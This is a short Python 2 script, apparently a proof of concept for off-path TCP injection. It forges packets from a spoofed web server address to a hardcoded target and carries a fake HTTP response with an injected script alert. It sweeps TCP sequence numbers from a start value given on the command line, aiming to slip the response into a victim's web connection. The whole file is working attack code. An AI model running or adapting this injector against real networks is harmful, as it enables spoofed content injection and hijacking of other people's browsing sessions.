#!/usr/bin/python

import socket
import dpkt
import dnet
import sys
import time



net = dnet.ip()



html = '''<h1>Win.</h1><script type="text/javascript">alert('pwnd');</script>\n'''

HTTP = '''HTTP/1.1 200
Content-Type: text/html
Content-Length: %d

%s''' % (len(html)-1, html)

HTTP = 'HTTP'*((1000-len(HTTP))/4) + HTTP

print 'HTTP payload len: %d' % len(HTTP)

def make_pkt(dport, seq):
    ip = dpkt.ip.IP(src=socket.inet_aton('69.171.229.11'), \
        dst=socket.inet_aton('141.212.111.200'), p=0x06)
    tcp = dpkt.tcp.TCP(sport=80, dport=dport, data=HTTP, flags=0, seq=seq)

    ip.data = tcp
    ip.len += len(ip.data)


    return ip

print 'gogogogo'
seq_start = int(sys.argv[2])

count = 0
start = time.time()
for seq in range(seq_start, 0, -len(HTTP)):
    net.send(str(make_pkt(int(sys.argv[1]), seq)))
    #time.sleep(0.0001)
    count += 1
    if (count % 10000) == 0:
        diff = time.time() - start
        print '%d in %f' % (count, diff)

print 'done :/'

